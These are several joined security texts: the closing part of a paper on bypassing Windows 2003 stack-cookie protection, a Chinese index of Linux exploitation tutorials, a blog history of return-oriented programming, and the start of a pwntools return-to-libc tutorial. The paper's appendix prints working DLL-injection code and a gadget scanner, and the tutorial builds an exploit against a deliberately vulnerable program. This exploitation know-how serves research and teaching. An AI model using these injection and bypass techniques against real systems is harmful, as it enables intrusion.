an\nANSI based overflow the values would need to be adjusted accordingly to do away with any\nNULLs.)\nThe location of this pointer needs to be stable however \u2013 and if the address that this pointer can\nbe found at wanders around then this will not work.\nWhilst most of the registered handlers just perform a jump to __except_handler3 in msvcrt.dll or\nare simply copies of it, this handler at 0x77F45A34 is not the only registered handler that can be\nabused in this fashion. Other modules use this same handler. In terms of protecting against\nabuse of existing handlers Microsoft should carefully examine every handler to see if it can be\nsubverted in a similar fashion and modified accordingly to prevent it.\nHeap Loading\nWe already know that if the address of the handler is on the stack it will not be called. This is not\ntrue of the heap however. This provides a third alternative but it is completely code dependent.\nEssentially the method involves loading a heap based buffer with exploit code and overwriting the\npointer to the exception handler with an address that points to the buffer on the heap. Needless to\nsay that if the address of this buffer is not predictable, that is, the address wanders too much from\nprocess instance to process instance then this method cannot be used effectively.\nAttacks that employ this method can be defeated by calling exception handlers if and only if they\nexist within the address range of a loaded module.\nCode Specific Methods\nThis section describes some of the methods that can be used when the code of the vulnerable\nfunction allows it.\nConsider the following function\nint foo(char **bar)\n{\n\fchar *ptr = 0;\nchar buffer[200]=\u201d\u201d;\nstrcpy(buffer,bar);\n..\n..\n*bar = ptr;\nreturn 0;\n}\nBefore this function returns the address of bar is updated to point to ptr. If we examine the\nassembly of this we have:\nMOV ECX, DWORD PTR [EBP+8] \/\/ **bar\nMOV EDX, DWORD PTR [EBP-8] \/\/ ptr\nMOV DWORD PTR [ECX],EDX\nAs we can see the address of bar is moved into ECX, the value of ptr is moved into EDX, which is\nthen moved into the address pointed to by ECX. We can see in the C source that there is an\nunsafe call to strcpy and a local buffer could be overflowed. If an attacker were to overflow this\nbuffer, overwrite the cookie and then overwrite the saved return address then they would begin to\noverwrite the parameters that were passed to the function. This means an attacker is in control of\nthe parameters. With the pointer update at the end of this function an attacker is in the position to\noverwrite an arbitrary address with whatever the value of ptr is; this occurs before the security\ncookie checking code is executed. This presents an attacker with several opportunities of attack\nto bypass stack protection. Before we look at these we should question whether this is a likely\nscenario, to which the answer is yes. If we disassemble many of the Windows functions we can\nsee this kind of action taking place fairly regularly. Indeed, the LSD DCOM buffer overflow\nsuffered from exactly this problem.\nDouble Cookie Overwrite\nIn such overflows where a similar arbitrary overwrite occurs an attacker could use this as an\nopportunity to overwrite the authoritative version of the cookie stored in the .data section.\nProviding the value that it is overwritten with is predictable or consistent then the attacker would\noverwrite the stack copy of the cookie with the same value so when the cookie checking code\nexecutes the cookie matches and a normal \u201csaved return address overwrite\u201d exploit would work.\nPreventing this kind of attack is as easy as marking the 32bits of .data section where the\nauthoritative cookie is stored as read only memory with a call to VirtualProtect:\nVirtualProtect(&Cookie,0x04,PAGE_READONLY,&old);\nThis should be executed as soon as the cookie has been set. [N.B. The smallest amount of\nmemory VirtualProctect can protect is a page \u2013 that is 4K bytes. The cookie needs to located at\nthe start of a page boundary and no other data that needs to be modified can be stored on the\nsame page.]\nSecurity Handler Overwrite\nRecall that, if the cookies do not match, a check is made to see if a security handler has been\ndefined. If one has then it is called. With such a scenario as described in the function above, an\nattacker could overwrite the address of the handler if one has been defined or set one if a one\nhas not been. Provided the pointer pointed to attacker supplied data then this would be a viable\noption. With regards to the DCOM overflow there was a complication that prevented such an\nattack. The Unicode buffer had to start with \u201c\\\\\u201d (0x5C005C00) as it needed to be a UNC path to\ntrigger the overflow.\n\fThe bytes 0x5C005C00, when translated to assembly is\nPOP ESP\nADD BYTE PTR[EAX+EAX+N]\nwhere N is the next byte in the buffer. As EAX+EAX+N was never writable the process would\naccess violate and the attacker would lose the chance to gain control.\nTo prevent such attacks there would be two options. One would be to not have a \u201csecurity\nhandler\u201d facility and just terminate the process. The other would be to mark the 32 bits of the\n.data section where the pointer to the handler exists as read only once it has been set.\nVirtualProtect(&sec_func,0x04,PAGE_READONLY,&old);\nThis would prevent such an attack. [Again, the same warning needs to be applied: VirtualProctect\nmodifies the permissions of a whole page. The cookie and the pointer to the security handler can\nbe place on the same page and then protected. No other data can be set on this page.]\nReplacing the Windows System Directory\nAgain, if the buffer pointed to by the pointer is controlled by the attacker it is possible to overwrite\nthe pointer to the Windows system directory, stored in the .data section of kernel32.dll. If the\ncookies don\u2019t match then, remember, the UnhandledExceptionFilter function is called. This\nfunction calls the GetSystemDirectoryW function which uses this pointer to get the directory. This\nis then copied to a buffer to which faultrep.dll is concatenated to. This library is then loaded and\nthe ReportFault function called. By replacing the pointer to the Windows system directory with a\npointer to the user supplied buffer an attacker could have the process load their own faultrep.dll\nthat exported a ReportFault function and place in there whatever code they see fit.\nLdr Shim function pointer overwrites\nMany of the Ldr* functions, that are called by functions such as LoadLibrary and FreeLibrary\ncheck to see if a function pointer has been set and calls it if one has been. This is related to the\nShim engine. As the UnhandledExceptionFilter function calls both LoadLibraryExW and\nFreeLibrary an attacker has the opportunity to set these function pointers which would then be\ncalled allowing the attacker to gain control. For example, FreeLibrary calls LdrUnloadDll in\nNTDLL.DLL and if we examine the code of this function we can find:\n77F5337A mov eax, [77FC2410]\n77F5337F cmp eax, edi\n77F53381 jne 77F53134\n..\n77F53134 push esi\n77F53135 call eax\nThis moves the value at address 0x77FC2410, in the .data section of NTDLL.DLL, into EAX and\nthen compares it with 0; EDI is 0. If EAX is not 0, in other words a function pointer is set at\n0x77FC2410, ESI is pushed onto the stack and the function is called. By setting this function\npointer an attacker could gain control.\nBoth this as an attack vector and the replacing of the pointer to the system directory are both\ndifficult to defend against and there are hundreds of other similar attack vectors. We can\u2019t go\naround VirtualProtecting everything. The best approach would be to simply create a new kernel\nfunction NTTerminateProcessOnStackOverflow, as indicated earlier and immediately call it if the\n\fcookies do not match. This function could be responsible for the important \u201cReport a Fault\u201d stuff.\nAs we can see there are just too many ways of subverting the stack based protecting mechanism\nto not to do this, in my opinion. If this were implemented then the attacker would need to revert to\ncausing exceptions and as we\u2019ve dispatched with those particular attacks we\u2019re left with a more\nrobust stack protection mechanism.\nWrapping Up\nThis paper has shown that currently there exists several methods to bypass the stack protection\nof Windows 2003 Server and there may yet be other ways. That said, if the recommendations\nmade in this paper were adopted the number of possible avenues available to bypass the\nprotection will be severely limited. There are a few, highly specific cases that could occur where\nthese suggestions would be of no consequence. For example consider the following code snippet\n#include <stdio.h>\n#include <windows.h>\nint main(int argc, char *argv[])\n{\nHMODULE Lib=NULL;\nunsigned int FuncAddress = 0;\nint err = 0;\nLib = LoadLibrary(\"msvcrt.dll\");\nFuncAddress = GetProcAddress(Lib,\"printf\");\nerr = DoStuff(argv[1],FuncAddress);\nreturn 0;\n}\nint DoStuff(char *buf, FARPROC fnk)\n{\nchar buffer[20]=\"\";\nstrcpy(buffer,buf);\n(fnk)(buffer);\n__asm add esp,4\nreturn 0;\n}\nHere a pointer to the printf function is passed as one of the parameters to the DoStuff function\nand then is called. If the local buffer in DoStuff is overflowed beyond the cookie and the saved\nreturn address the function parameters are overwritten. Thus when the \u201cprintf\u201d function is called\nthe attacker can gain control. This is a highly manufactured situation, however, and is not likely to\nexist \u201cin the wild\u201d but that is not the point though. The point is that there may always be issues like\nthis that can allow an attacker to gain control despite any protection offered by the operating\nsystem. As such, it is always advisable never to rely on such protection. The old adage\n\u201cprevention is better than the cure\u201d springs to mind; there is definitely no substitute for secure\ncoding practices.\n\fAppendix A\nThe two code listings can be used to inject code into another process to load a DLL and execute\na function. This function searches the address space of the process for the bytes that form\ninstructions that can be used to bypass stack protection using Structured Exception Handling.\nWhen compiled run from a command line\nC:\\>inject pid code.dll code\nThe results will be output to a file called results.txt.\n\/* Inject.c \u2013 compile C:\\>cl \/TC inject.c *\/\n#include <stdio.h>\n#include <windows.h>\nDWORD __stdcall RThread(pfnktstuff);\n#define MAXINJECTSIZE 4096\ntypedef struct fnktstuff_t\n{\nunsigned int LoadLibraryAddress;\nunsigned int GetProcAddressAddress;\nunsigned char Library[260];\nunsigned char Function[260];\n} fnktstuff;\nDWORD __stdcall RThread( fnktstuff *pfs)\n{\n__asm{\nmov edi,dword ptr[esp+08h] \/\/ Get Pointer to pfs\npush edi\nlea esi, dword ptr [edi+8] \/\/ Get Pointer to Library\npush esi \/\/ Push onto the stack\ncall dword ptr[edi] \/\/ call LoadLibrary\ncmp eax,0\nje end\npop edi\nlea esi, dword ptr [edi+268]\npush esi\npush eax\ncall dword ptr[edi+4]\ncmp eax,0\nje finish\ncall eax\njmp finish\nend:\npop edi\nfinish:\n}\n\freturn 0;\n}\nint main(int argc, char *argv[])\n{\nHANDLE hProcess=NULL;\nHANDLE hRemoteThread=NULL;\nint ProcessID=0;\nvoid *FunctionAddress=0;\nvoid *data=NULL;\nHMODULE k=NULL;\nfnktstuff fs;\nif(argc !=4)\nreturn printf(\"C:\\\\>%s PID Library Function\\n\",argv[0]);\nk = LoadLibrary(\"kernel32.dll\");\nfs.GetProcAddressAddress = (unsigned int)GetProcAddress(k,\"GetProcAddress\");\nfs.LoadLibraryAddress = (unsigned int)GetProcAddress(k,\"LoadLibraryA\");\nZeroMemory(fs.Library,260);\nZeroMemory(fs.Function,260);\nstrncpy(fs.Library,argv[2],256);\nstrncpy(fs.Function,argv[3],256);\nProcessID = atoi(argv[1]);\nif(ProcessID == 0)\nreturn printf(\"ProcessID is 0\\n\");\nhProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,ProcessID);\nif(hProcess == NULL)\nreturn printf(\"OpenProcess() failed with error: %d\\n\",GetLastError());\nprintf(\"Process %d opened.\\n\",ProcessID);\nFunctionAddress = VirtualAllocEx(hProcess,0,MAXINJECTSIZE\n,MEM_COMMIT,PAGE_EXECUTE_READWRITE);\nif(FunctionAddress == NULL)\n{\nprintf(\"VirtualAllocEx() failed with error: %d\\n\",GetLastError());\nCloseHandle(hProcess);\nreturn 0;\n}\nprintf(\"RemoteAddress is %.8x\\n\",FunctionAddress);\ndata = (unsigned char *) VirtualAllocEx(hProcess,0,MAXINJECTSIZE,\nMEM_COMMIT,PAGE_READWRITE);\nif(data == NULL)\n{\nprintf(\"VirtualAllocEx() failed with error: %d\\n\",GetLastError());\nCloseHandle(hProcess);\nreturn 0;\n}\nprintf(\"DataAddress is %.8x\\n\",data);\nWriteProcessMemory(hProcess, FunctionAddress, &RThread, MAXINJECTSIZE, 0);\nWriteProcessMemory(hProcess, data, &fs, sizeof(fnktstuff), 0 );\nhRemoteThread = CreateRemoteThread(hProcess,NULL,0,\nFunctionAddress,data,0,NULL);\nif(hRemoteThread == NULL)\n{\nprintf(\"CreateRemoteThread() failed with error: %d\\n\",GetLastError());\nCloseHandle(hProcess);\n\freturn 0;\n}\nCloseHandle(hRemoteThread);\nCloseHandle(hProcess);\nreturn 0;\n}\nThe code of the DLL:\n\/\/ Compile: C:\\>cl \/LD code.dll\n#include <stdio.h>\n#include <windows.h>\nint __declspec (dllexport) code()\n{\nFILE *fd = NULL;\nunsigned char *p = 0;\nunsigned char *c = (char *)0x7fffffff;\nfd = fopen(\"results.txt\",\"w+\");\nif(!fd)\nreturn 0;\nwhile(p < c)\n{\n__try{\nif ((p[0] > 0x57) && (p[0] < 0x5F) && (p[1] > 0x57) && (p[1] < 0x5F) && (p[2] > 0xC1) &&\n(p[2] < 0xC4))\nfprintf(fd,\"pop, pop, ret found at\\t\\t\\t%.8X\\n\", p );\nelse if (p[0] == 0xFF)\n{\nif(p[1] == 0x55)\n{\nif(p[2] == 0x30)\nfprintf(fd,\"call dword ptr[ebp+30] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24)\nfprintf(fd,\"call dword ptr[ebp+24] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x0C)\nfprintf(fd,\"call dword ptr[ebp+0C] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0xFC)\nfprintf(fd,\"call dword ptr[ebp-04] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0xF4)\nfprintf(fd,\"call dword ptr[ebp-0C] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0xE8)\nfprintf(fd,\"call dword ptr[ebp-18] found at\\t\\t%.8X\\n\", p );\n}\nelse if(p[1] == 0x65)\n{\nif(p[2] == 0x30)\nfprintf(fd,\"jmp dword ptr[ebp+30] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24)\nfprintf(fd,\"jmp dword ptr[ebp+24] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x0C)\n\ffprintf(fd,\"jmp dword ptr[ebp+0C] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0xFC)\nfprintf(fd,\"jmp dword ptr[ebp-04] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0xF4)\nfprintf(fd,\"jmp dword ptr[ebp-0C] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0xE8)\nfprintf(fd,\"jmp dword ptr[ebp-18] found at\\t\\t%.8X\\n\", p );\n}\nelse if(p[1] == 0x54)\n{\nif(p[2] == 0x24 && p[3] == 0x08)\nfprintf(fd,\"call dword ptr[esp+08] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24 && p[3] == 0x14)\nfprintf(fd,\"call dword ptr[esp+14] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24 && p[3] == 0x1C)\nfprintf(fd,\"call dword ptr[esp+1C] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24 && p[3] == 0x2C)\nfprintf(fd,\"call dword ptr[esp+2C] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24 && p[3] == 0x44)\nfprintf(fd,\"call dword ptr[esp+44] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24 && p[3] == 0x50)\nfprintf(fd,\"call dword ptr[esp+50] found at\\t\\t%.8X\\n\", p );\n}\nelse if(p[1] == 0x64)\n{\nif(p[2] == 0x24 && p[3] == 0x08)\nfprintf(fd,\"jmp dword ptr[esp+08] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24 && p[3] == 0x14)\nfprintf(fd,\"jmp dword ptr[esp+14] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24 && p[3] == 0x1C)\nfprintf(fd,\"jmp dword ptr[esp+1C] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24 && p[3] == 0x2C)\nfprintf(fd,\"jmp dword ptr[esp+2C] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24 && p[3] == 0x44)\nfprintf(fd,\"jmp dword ptr[esp+44] found at\\t\\t%.8X\\n\", p );\nelse if(p[2] == 0x24 && p[3] == 0x50)\nfprintf(fd,\"jmp dword ptr[esp+50] found at\\t\\t%.8X\\n\", p );\n}\n}\n}\n__except(EXCEPTION_EXECUTE_HANDLER)\n{\np += 0x00000100;\n}\np++;\n}\nfclose(fd);\nreturn 0;\n}\n\f\f"}
{"text":"# \u6808\u7684\u5b89\u5168\n\n## \u57fa\u672c\u7684\u6f0f\u6d1e\u5229\u7528\n\n[format strings on linux32](.\/format-strings.md)\n\n[Integer-overflow on Linux32](.\/integer-overflow.md)\n\n[off by one on linux32](.\/off-by-one.md)\n\n## \u5bf9\u6297\u57fa\u4e8e\u6808\u4e0a\u7684\u5b89\u5168\u673a\u5236\n\n### NX\n\n[ret2libc bypass nx on linux32](.\/linux-x86-ret2libc.md)\n\n[rop on Linux32](.\/linux-x86-rop.md)\n\n[rop chain on linux32](.\/linux-x86-rop-chain.md)\n\n### ASLR\n\n[ret2plt bypass aslr on linux32](.\/ret2plt-bypass-aslr.md)\n\n[got overwrite bypass aslr on linux32](.\/overwrite-got-bypass-aslr.md)\n\n[brute force bypass aslr on linux32](.\/brute-force-bypass-aslr.md)\n"}
{"text":"#[1]Ralf-Philipp Weinmann & Vincenzo Iozzo own the iPhone at PWN2OWN\n[2]blog.zynamics.com\nthe official zynamics company blog\n__________________________________________________________________\n\u00c2\u00ab [3]The REIL language \u00e2 Part I\n[4]Ralf-Philipp Weinmann & Vincenzo Iozzo own the iPhone at PWN2OWN \u00c2\u00bb\nA gentle introduction to return-oriented programming\nHi,\nAs I have promised in [5]my last post I will start a series about\nreturn-oriented programming. I start with a short introduction about\nthe topic. The introduction covers the origin of return-oriented\nprogramming, describes what return-oriented programming is and ends\nwith a definition of return-oriented programming which I will use in\nthe future posts. I will also take some of the recent discussions on\nTwitter into account which showed that even though I thought I did my\nhistory research pretty well, there were still some mailing list post\nmissing from my time-line.\nWhy do we need return-oriented programming ?\nReturn-oriented programming is a technique which allows an attacker to\nexecute code in the presence of the following defensive measures.\n* Non executable memory segments\n* Code signing\nWhere does return-oriented programming come from ?\nReturn-oriented programming is a recently coined term which describes a\ntechnique that has been developed in an iterative process in the\nsecurity community. The terminology return-oriented programming is used\nfor a subset of techniques which can be referred to as code reuse\ntechniques. To understand where return-oriented programming comes from\nI show some of the milestones of the techniques history.\nBuffer overflows were first publicly documented in the [6]Computer\nSecurity Technology Planning Study in 1972 (Appendix 1. Incomplete\nParameter Checking). To put this in perspective one must remember that\neven though we now know that this document was published at the time\nonly a small circle of individuals had access to the document then.\nA buffer overflow is, in the original form, a very simple error that is\nintroduced if a function does not perform proper bounds checking for\nthe accessed memory. Basically this means the function receives more\ninput data than it can store. Assuming that the overflowed buffer was\nlocated on the stack, the attacker can now write a certain amount of\ndata onto the stack where other variables and the return address might\nbe located. Therefore the attacker can hijack the control flow of the\ncurrent process and perform an arbitrary computation.\nThe first major attack which used a buffer overflow as the targeted\nvulnerability was the Morris worm in 1988. But it was not until the\nlate 90s that major operating systems started to have any protection\nagainst buffer overflows. For Microsoft operating systems a form of\nprotection against buffer overflows was only added after the Code-Red\nand Slammer worms had changed their security mindset in [7]2004.\nOne of the defensive measures which have been developed to defend\nagainst buffer overflows is the option to mark data memory segments as\nnon-executable. This lead to the next evolutionary step towards\nreturn-oriented programming.\nReturn-into-library technique\nThe return-into-library technique is the root on which all\nreturn-oriented exploit approaches are based.\nA return-into-library exploit works as follows: After the attacker has\nhijacked the control flow, a library function he chooses is executed.\nThe attacker has made sure that the stack pointer points into a memory\nsegment he controls. The attacker has set up the data in the memory\nsegment in a way that it provides the right arguments to the library\nfunction of his choice. Through this he can execute a function with the\nneeded arguments.\nThe technique of return-into-library exploits was initially presented\npublicly by Solar Designer in his [8]1997 posting to the Bugtraq\nmailing list. In this mail the groundwork for return-into-library\nexploiting was presented. The next milestone in the development of the\ntechnique was the [9]Phrack article by Nergal which summarized the\nknown techniques and broadened the attack vector by introducing esp\nshifting which allowed unlimited chaining of function calls to be used\nwithin return-into-library exploitation.\nBorrowed code chunks technique\nWith the introduction of hardware-supported non-executable memory\nsegments in combination with the support of 64 Bit CPUs the game\nchanged again and traditional return-into-library exploits ceased to\nwork. This was due to an ABI change which now required that the\narguments to a function must be passed in registers rather than on the\nstack. Stealth developed a [10]new approach that uses chunks of library\nfunctions instead of the call to the function itself to still be able\nto exploit buffer overflows on machines that employed the newly\nintroduced defense. The approach is designed around the idea to locate\ninstruction sequences which pop values from the stack into the right\nregisters for function calls. By using his approach an attacker can use\nreturn-into-library exploits with the new ABI. A library which uses\nthis technique in an automated fashion is [11]DEPLib which has been\ndeveloped by Pablo Sole. This library completely automates the\nreturn-oriented approach for Windows operating systems but it lacks\nsupport for loops and conditional branches (which is from a practical\npoint of view negligible).\nReturn-oriented programming\nThe return-oriented programming technique broadens the attack vector\neven further by introducing loops and conditional branches for the\nreturn-oriented approach. The first academic work published in the\nfield of return-oriented programming is Hovav Shacham\u00e2s [12]\u00e2The\nGeometry of Innocent Flesh on the Bone: Return-into-libc without\nfunction Calls (on the x86)\u00e2 It describes the two major points which\nget addressed by return-oriented programming in contrast to the rest of\nthe return-into-library techniques.\n* The return-into-library technique has no support for loops and\nconditional branching.\n* The removal of functions from libraries does not provide any\nsecurity against return-oriented programming.\nFor the x86 the approach he uses to find suitable instruction sequences\nis based on the fact that the x86 uses a variable length instruction\nset. Therefore it is possible to search for single binary opcodes which\nalter control flow such as the return instruction (0xC3) and\ndisassemble the binary from this position backwards. Because x86 uses a\nvariable length instruction set the bytes before the return instruction\ncan provide many possible instruction sequences. Shacham also defined\nthe term gadget which describes one useful instruction sequence which\nperforms one useful operation such as addition.\nOne assumption which Shacham made is that he thought a fixed length\ninstruction set would make the application of return-oriented\nprogramming unfeasible. This was shown not to be the case by [13]Ryan\nRoemers work which targeted the SPARC architecture which can be seen as\nthe anti-thesis to the x86 architecture. One change which he needed to\nincorporate into his gadget set was that only memory could be used to\npass information between gadgets. This is due to the way SPARC passes\ninformation in registers by shifting the register window.\nThe most practical work which has been published in the field of\nreturn-oriented programming is the [14]recent work which targeted the\nAVC Advantage voting system. This work has provided proof that\nreturn-oriented programming is a valid tool for the offensive security\nresearcher as no other technique would have been as useful against the\nHarvard-type architecture upon which the AVC Advantage is build.\nWhat did we learn ?\nReturn-oriented programming is a recently coined term but the\nunderlying technology has a long history which is based on the work of\nmany security researchers. We have started with its roots in\nreturn-into-library attacks and showed how it evolved until today.\nIn the next post on return-oriented programming I will explain the\nfirst steps of my approach to make return-oriented programming platform\nindependently.\nTim\nThis entry was posted on Friday, March 12th, 2010 at 11:11 and is filed\nunder [15]ROP.\n19 Responses to \u00e2A gentle introduction to return-oriented programming\u00e2\n1. [16]\u00e2\u00a6\u00e2\u00a6\u00e2\u00a6..und der Admin hyperventilierte \u00c2\u00bb Blog Archive \u00c2\u00bb 10\nder besten, interessantesten, wichtigsten und unterhaltsamsten\nArtikel aus der Security-Branche. says:\n[17]2010-03-16 at 11:37\n[\u00e2\u00a6] A gentle introduction to return-oriented programming [\u00e2\u00a6]\n2. jf says:\n[18]2010-04-13 at 15:47\nty for explicitly stating (by stating explicitly what the technique\ndoes bypass) that this isnt a given ASLR bypass technique, as\neveryone else seems to miss.\n[19]Algorithms for platform independent return-oriented programming\n(I of III) \u00c2\u00ab blog.zynamics.com says:\n[20]2010-04-16 at 09:28\n[\u00e2\u00a6] for platform independent return-oriented programming (I\nof III) By Tim Kornau In my last post about the history of\nreturn-oriented programming I showed that we are not dealing with a\ncompletely [\u00e2\u00a6]\nAnon says:\n[21]2010-04-16 at 21:09\nCan anyone write a brief guide illustrating the use of rop in an\nexploit? Like say our codebase is in file.dll, we have control of\nsome return address and want to use rop to copy shellcode from the\nbuffer on the stack, to an rwx memory area and then pass program\nflow to it.\nHow would the \u00e2gadgets\u00e2 from the codebase be generated? Basically\nI\u00e2m just looking for help on how to convert a regular sequence of\nassembly instructions into its equivalent rop code. Thinking of it\nas the roles of eip\/esp being switched is also kind of confusing\nand not intuitive.\nAnon says:\n[22]2010-04-16 at 21:11\nOh! I just noticed there\u00e2s a second post. Reading that now and\nhopefully it will answer some questions.\n[23]A brief analysis of a malicious PDF file which exploits this\nweek\u00e2s Flash 0-day \u00c2\u00ab blog.zynamics.com says:\n[24]2010-06-09 at 19:12\n[\u00e2\u00a6] list of addresses that point into code of an Adobe Reader DLL\ncalled BIB.DLL. We were dealing with return-oriented shellcode [\u00e2\u00a6]\n[25]corelanc0d3r says:\n[26]2010-06-17 at 21:28\nFYI \u00e2 I published a basic tutorial on return oriented programming :\n[27]http:\/\/www.corelan.be:8800\/index.php\/2010\/06\/16\/exploit-writing\n-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube\/\nenjoy\n[28]Exploit writing tutorial part 10 : Chaining DEP with ROP \u00e2 the\nRubik\u00e2s[TM] Cube | Peter Van Eeckhoutte's Blog says:\n[29]2010-08-23 at 11:54\n[\u00e2\u00a6] Gentle introduction to return-oriented-programming [\u00e2\u00a6]\n[30]Online Ouija Board says:\n[31]2010-09-14 at 08:42\ni was just thinking about this similar thing before haha, excellent\narticle\n[32]A gentle introduction to return-oriented programming \u00c2\u00ab clnoe ==\neohnik says:\n[33]2011-01-19 at 09:01\n[\u00e2\u00a6] :\n[34]http:\/\/blog.zynamics.com\/2010\/03\/12\/a-gentle-introduction-to-re\nturn-oriented-programming\/ This entry was written by clnoe, posted\non January 19, 2011 at 9:01 am, filed under [\u00e2\u00a6]\n[35]Exploiting Stack Buffer Overflows | The Blog says:\n[36]2011-04-13 at 07:56\n[\u00e2\u00a6] interesting [\u00e2\u00a6]\n[37]Securabit SEG style #2 JOP with Tyler Bletsch \u00c2\u00ab SecuraBit says:\n[38]2012-03-13 at 15:23\n[\u00e2\u00a6] ROP [39]http:\/\/cseweb.ucsd.edu\/~hovav\/dist\/rop.pdf\na-gentle-introduction-to-return-oriented-programming [\u00e2\u00a6]\n[40]Exploit Developer's Corner: Mr_me and Aurora DEP bypass \u00c2\u00ab\nSecuraBit says:\n[41]2012-03-13 at 16:21\n[\u00e2\u00a6] ROP return-oriented programming Zynamics introduction to ROP\nis a popular technique used to bypass DEP and jump to alternate\nmemory locations by using code that [\u00e2\u00a6]\n[42]the way to learn. | \u00e9\u00bb\u00e7\u00af\u00b7\u00e8\u00bd\u00a6 says:\n[43]2012-09-09 at 15:24\n[\u00e2\u00a6]\n[44]http:\/\/blog.zynamics.com\/2010\/03\/12\/a-gentle-introduction-to-re\nturn-oriented-programming\/ [\u00e2\u00a6]\n[45]From Three Nations and Three Different Perspectives, Blue Hat\nFinalists Focus on Defense | Threatpost says:\n[46]2013-03-25 at 01:02\n[\u00e2\u00a6] iterative development in the security community for more than\na decade, ROP allows an attacker to sidestep more modern operating\nsystem defenses, such as non-executable memory \u00e2 also known as data\nexecution prevention \u00e2 and code [\u00e2\u00a6]\n[47]From Three Nations and Three Different Perspectives, Blue Hat\nFinalists Focus on Defense | Threatpost says:\n[48]2013-05-15 at 12:46\n[\u00e2\u00a6] iterative development in the security community for more than\na decade, ROP allows an attacker to sidestep more modern operating\nsystem defenses, such as non-executable memory \u00e2 also known as data\nexecution prevention \u00e2 and code [\u00e2\u00a6]\n[49]Return-oriented-programming practice: exploiting CodeGate 2010\nChallenge 5 | VNSecurity says:\n[50]2014-10-20 at 02:39\n[\u00e2\u00a6] A worth to read post about ROP introduction can be found on\nZynamics blog:\n[51]http:\/\/blog.zynamics.com\/2010\/03\/12\/a-gentle-introduction-to-re\nturn-oriented-programming\/ [\u00e2\u00a6]\n[52]Further Android Vulnerabilities Disclosed | securityinaction\nsays:\n[53]2015-08-19 at 19:55\n[\u00e2\u00a6] the PC to a ROP (return oriented programming) gadget (both\ndefined) and employs a stack pivoting technique. This ROP chain\nchanges the memory space (mentioned above) [\u00e2\u00a6]\n[54]Possible Future Security Improvements For Adobe Flash Player In\nDevelopment | securityinaction says:\n[55]2015-11-30 at 21:16\n[\u00e2\u00a6] Since Flash Player incorporates commonly used defences such as\nDEP and ASLR (references discussing DEP are provided here (see\n\u00e2References\u00e2 at the end of the post), while ASLR is discussed here\nand here (see \u00e2References\u00e2 at the end of the post)) attackers\ngenerally seek to bypass these mitigations using a technique known\nas Return Oriented Programming (ROP)(defined). [\u00e2\u00a6]\n__________________________________________________________________"}
{"text":"#[1]made0x78 Security Feed\n* [2]Skip to primary navigation\n* [3]Skip to content\n* [4]Skip to footer\n[5]made0x78 Security\n* [6]Tags\n(BUTTON) Toggle menu\n[7]made0x78\nIT Security Consultant\n(BUTTON) Follow\n* 127.0.0.1\n[8]Binary Exploitation Series (4): Return to Libc\n6 minute read\nThis time we will activate non-executable stack and we\u2019re going to\nbuild our first mini ROP-Chain to leak memory addresses! Basic ASLR is\nof course still enabled (only Heap and Stack randomized). I will also\nintroduce some more features of pwntools.\nTarget\nThe [9]target is again a simple binary where we can spot the\nvulnerability after a few seconds. In the function check_username we\ndeclare a 32-byte buffer to store a username. After that, we prompt the\nuser to input a name but the fgets call reads up to 200 bytes which\ncould lead again to a buffer overflow.\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\/\/gcc -m64 -o chapter_4 chapter_4.c -no-pie -fno-stack-protector\nvoid check_username() {\nchar name[32];\nputs(\"Name?\");\nfgets(name, 200, stdin);\nif(strcmp(name, \"admin\\n\") == 0) {\nputs(\"Nope. Invalid username.\");\n}\nelse {\nputs(\"OK\");\n}\n}\nint main(int argc, char **argv) {\ncheck_username();\nreturn 0;\n}\nAnalysis\nSince we know a little bit about pwntools, thanks to the last post, and\nwe have the source code of the target, we can directly start writing\nour exploit. First, import all pwntools functions and load the binary.\nfrom pwn import *\nr = process(\".\/chapter_4\")\ncontext.binary = '.\/chapter_4'\nThen we will attach the debugger gdb again \u2026\n# attach gdb and continue\ngdb.attach(r.pid, \"\"\"c\"\"\")\n\u2026 and we trigger the buffer overflow with a simple payload.\npayload = \"A\"*50\nr.sendline(payload)\nr.interactive() # we don't want to close the application\nCrashed, perfect!\nNext, we try to find the offset to the return address on the stack.\nThis can be done manually with static or dynamic analysis or we just\nuse gdb and a really useful [10]pwntools function. Let\u2019s change the\npayload to payload = cyclic(50) and run it again. Crashed. Now we can\ncompute the offset to the return address by taking a word (w) at the\ntop of the stack (rsp) as an argument to pwntools\u2019 cyclic_find\nfunction.\ngef\u27a4  x\/wx $rsp\n0x7ffecfec1e98:    0x6161616b\n# ipython\nIn [1]: from pwn import *\nIn [2]: cyclic_find(0x6161616b)\nOut[2]: 40\nOk, we have an offset of 40 to the return address of this function\n(32-byte buffer + 8 byte which is the saved base pointer).\nSince we can\u2019t execute our shellcode on the stack, we have to find\nanother way. For now, we do the following steps to achieve code\nexecution:\n* Leak libc pointers via GOT (Global Offset Table)\n+ Leak pointer to puts\n* Identify libc library (optional, in this case not necessary)\n+ Leak another pointer to fgets\n+ Use leaked pointers of puts and fgets to find the correct libc\n* Compute libc\u2019 base address\n* Find a suitable one-shot gadget to achieve code execution\n* Maybe find suitable gadgets to modify the registers for the\none-shot gadget (in this case not necessary)\n* Redirect execution to the vulnerable function (otherwise the\nexecutable would exit)\n* Exploit the same vulnerability a second time and pop a shell!\nFirst, we have to call the function puts with a GOT address as argument\nto read the pointer. We can also use pwntools to support us in our\nexploit development. 